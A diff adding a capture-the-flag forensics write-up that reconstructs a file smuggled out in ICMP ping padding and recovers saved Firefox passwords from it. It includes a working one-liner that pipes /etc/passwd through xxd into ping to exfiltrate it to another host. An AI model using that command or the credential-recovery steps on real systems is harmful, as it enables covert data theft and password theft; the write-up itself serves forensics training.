@@ -642,6 +642,142 @@ Solved By: firedank
 
 Solved By: payl0ad
 
+This was a forensics challenge that provides a pcap file.
+Opening up the file there is a lot of traffic over ipv4 and ipv6.
+The most interesting traffic seems to be ICMP between two nodes with data streams that do not look like normal icmp requests.
+![](writeupfiles/TheOldestTrickintheBook1.png)
+
+A typical icmp request packet will have data that resembles something like the following:
+```
+101112131415161718191a1b1c1d1e1f
+```
+
+In the pcap file provided we see: 
+```
+b12a070000000000431e847adbb24d7dd6f70f30c1f4931e431e847adbb24d7dd6f70f30c1f4931e431e847adbb24d7d
+```
+
+At this point this data is now of interest, but the goal is to discover what it is.
+All of the packets are duplicated so we'll load up an iPython console and import Scapy to filter out only icmp requests which originate from `192.168.1.7`.
+ 
+```python
+In [1]: from scapy.all import IP, ICMP, rdpcap
+
+In [2]: pcap = rdpcap('older_trick.pcap')
+
+In [3]: packets = [p for p in pcap if ICMP in p]
+
+In [4]: packets = [p for p in packets if p[IP].src == '192.168.1.7']
+
+In [5]: packets
+Out[5]: 
+[<CookedLinux  pkttype=sent-by-us lladdrtype=0x1 lladdrlen=6 src="\x08\x00'Y8b\x08\x0e" proto=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=84 id=29779 flags=DF frag=0 ttl=64 proto=icmp chksum=0x42f6 src=192.168.1.7 dst=192.168.1.8 
+|<ICMP  type=echo-request code=0 chksum=0xeb56 id=0xb1a5 seq=0x1 |<Raw  load='(\xecu`\x00\x00\x00\x00\xb7\xae\x04\x00\x00\x00\x00\x00PK\x03\x04\x14\x00\x00\x00\x00\x00r\x9e\x8dRe\x9bPK\x03\x04\x14\x00\x00\x00\x00\x00r\x9e\x8dRe\x9bPK\x03\x04\x14\x00\x00\x00' |>>>>,
+ <CookedLinux  pkttype=sent-by-us lladdrtype=0x1 lladdrlen=6 src="\x08\x00'Y8bDv" proto=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=84 id=29782 flags=DF frag=0 ttl=64 proto=icmp chksum=0x42f3 src=192.168.1.7 dst=192.168.1.8 
+ |<ICMP  type=echo-request code=0 chksum=0x5724 id=0xb1a6 seq=0x1 |<Raw  load='(\xecu`\x00\x00\x00\x00\xea\xd1\x04\x00\x00\x00\x00\x00Lk\x18\x00\x00\x00\x18\x00\x00\x00\x10\x00\x00\x00fiLk\x18\x00\x00\x00\x18\x00\x00\x00\x10\x00\x00\x00fiLk\x18\x00\x00\x00\x18\x00' |>>>>,
+```
+The interesting data is in the 'Raw load' of the packet so lets import Raw from Scapy and convert to hex:
+
+```python
+In [7]: for p in packets:
+   ...:     print(p[Raw].load.hex())
+   ...: 
+28ec756000000000b7ae040000000000504b0304140000000000729e8d52659b504b0304140000000000729e8d52659b504b030414000000
+28ec756000000000ead10400000000004c6b18000000180000001000000066694c6b18000000180000001000000066694c6b180000001800
+```
+
+This output includes the timestamp so If we strip out the timestamp which is 8 bytes we're left with the full data field:
+```
+In [8]: for p in packets:
+   ...:     print(p[Raw].load.hex()[16:])
+   ...: 
+b7ae040000000000504b0304140000000000729e8d52659b504b0304140000000000729e8d52659b504b030414000000
+ead10400000000004c6b18000000180000001000000066694c6b18000000180000001000000066694c6b180000001800
+```
+
+And now if we strip out the padding which is also 8 bytes we're left with only the we need to recover.  Most implementations of the Ping utility accept command line option '-p' that allows up to 16 bytes of padding to fill out the ICMP ECHO_REQUEST packets that will be sent.
+```
+In [9]: for p in packets:
+   ...:     print(p[Raw].load.hex()[32:])
+   ...: 
+504b0304140000000000729e8d52659b504b0304140000000000729e8d52659b504b030414000000
+4c6b18000000180000001000000066694c6b18000000180000001000000066694c6b180000001800
+```
+
+We do see some repeating data with what also seems to be a padding in the packet.  We can quickly duplicate this with data we expect to see.
+As an example we can assume from the above that the data exfiltrated was sent in 16 byte chunks.
+```bash
+└──╼ $cat /etc/passwd | xxd -p -c 16 | head -n2 | xargs -I {} ping -c 1 -t 1 -p '{}' 10.0.0.36
+PATTERN: 0x726f6f743a783a303a303a726f6f743a
+PING 10.0.0.36 (10.0.0.36) 56(84) bytes of data.
+64 bytes from 10.0.0.36: icmp_seq=1 ttl=64 time=0.655 ms
+
+--- 10.0.0.36 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.655/0.655/0.655/0.000 ms
+PATTERN: 0x2f726f6f743a2f62696e2f626173680a
+PING 10.0.0.36 (10.0.0.36) 56(84) bytes of data.
+64 bytes from 10.0.0.36: icmp_seq=1 ttl=64 time=0.592 ms
+
+--- 10.0.0.36 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.592/0.592/0.592/0.000 ms
+```
+With the padding and repeating data stripped out we're left with 16 bytes of data which is in line with our pcap file.
+When that data is converted from hex to ascii we have exactly what we expect which is the first line of /etc/passwd
+```
+726f6f743a783a303a303a726f6f743a
+2f726f6f743a2f62696e2f626173680a
+```
+
+```bash
+└──╼ $echo 726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a | xxd -p -r
+root:x:0:0:root:/root:/bin/bash
+```
+
+Now we can fill out the rest of our script to reconstruct a file from the data exfil
+```python
+#!/usr/bin/python3
+from scapy.all import IP, ICMP, rdpcap, Raw
+from binascii import unhexlify
+print("Loading pcap file")
+pcap = rdpcap('older_trick.pcap')
+print("Filtering ICMP packets")
+packets = [p for p in pcap if ICMP in p]
+print("Extracting ICMP request packets only")
+packets = [p for p in packets if p[IP].src == '192.168.1.7']
+
+dataload = ''
+#Stripping 8 byte timestamp and 8 bytes of padding
+f = open('data', 'wb')
+for p in packets:
+    chunk = ''
+    chunk = p[Raw].load.hex()
+    #strip out timestamp and padding
+    chunk = chunk[32:]
+    #strip out repeating data
+    chunk = chunk[:32]                                                                                           
+    dataload += chunk                                                                                            
+print("Writing file...")                                                                                         
+f.write(unhexlify(dataload))                                                                                     
+f.close()
+```
+
+And this is the result:
+```bash
+ └──╼ $file data
+data: Zip archive data, at least v2.0 to extract
+```
+
+After unzipping the file we're left with what seems to be a Firefox profile.
+
+The very first thing i did was try to copy everything into a new Firefox profile, but after opening the browser it errors out with complains of an older profile and exits out.  So here's where I spent some time - Theres a number of sqlite db files that send you down a rabbit hole.  I went back and forth thinking I was missing something (I was) and knew it had to be credential related (it was), but I went about it the wrong way for a bit as I kept thinking it was supposed to be in a sqlite db file.
+Eventually all that is required is to copy over the logins.json file and along with the key4.db file instead of trying to use the entire folder contents in a profile.
+After that is copied over open Firefox and view the saved passwords and you're presented with the flag.
+![](writeupfiles/TheOldestTrickintheBook2.png)
+
+Overall a fun challenge as this was something I had heard of, but never tried or seen in practice.   
+
 ##
 
 ## Key mission
